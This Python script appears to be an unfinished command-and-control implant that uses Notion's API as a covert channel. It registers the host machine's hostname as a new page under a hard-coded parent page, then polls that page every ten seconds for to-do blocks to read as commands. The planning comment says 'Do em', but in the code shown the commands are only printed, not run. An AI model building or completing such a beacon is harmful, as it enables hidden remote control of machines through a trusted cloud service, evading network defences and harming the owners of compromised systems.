import os
import sys
import argparse
import requests
from getpass import getpass
import socket
from time import sleep

"""
Things we need to do:

Load the API key*
Start comms by making a new page
Sleep 
Get new blocks
Any new commands?
Do em
"""
PARENT_PAGE_ID = "32b833db-af3f-4958-9960-339c2b658280"
SLEEP_INTERVAL = 10
URL_BASE = "https://api.notion.com/v1"

def create_page(headers):

    hostname = socket.gethostname()
    url = f"{URL_BASE}/pages/"
    
    body = {
        "parent": {
            "type": "page_id",
            "page_id": PARENT_PAGE_ID
        },
        "properties": {
            "title": [{
                "text": {
                    "content": hostname
                }
            }]
        }
    }
    r = requests.post(url, json=body, headers=headers)
    if r.status_code == 200:
        id = r.json()["id"]
        return id
    else:
        print(r.content)

def get_blocks(headers, page_id):
    """
    Retrieve blocks from the parent page
    """
    url = f"{URL_BASE}/blocks/{page_id}/children"
    r = requests.get(url, headers=headers)
    if r.status_code == 200:
        return r.json()["results"]
    
    return None

def new_command(blocks):
    return blocks[-1]["type"] == "to_do"

def extract_command(block):
    return block["to_do"]["text"][0]["text"]["content"]

def main():
    print("I'm sorry if this Notion is Offensive to you.")
    try:
        NOTION_API_KEY = os.environ["NOTION_API_KEY"]
    except:
        NOTION_API_KEY = getpass("Enter API Key: ")

    headers = {
        "Notion-Version": "2021-08-16",
        "Content-Type": "application/json",
        "Authorization": f"Bearer {NOTION_API_KEY}"
    }

    page_id = create_page(headers)
    print(page_id)

    # Main event loop
    while True:
        blocks = get_blocks(headers, page_id)
        if blocks:
            print(blocks[-1])
            if new_command(blocks):
                command = extract_command(blocks[-1])
                print(command)
        else:
            print("ZZZZ")
        sleep(SLEEP_INTERVAL)



if __name__ == "__main__":
    main()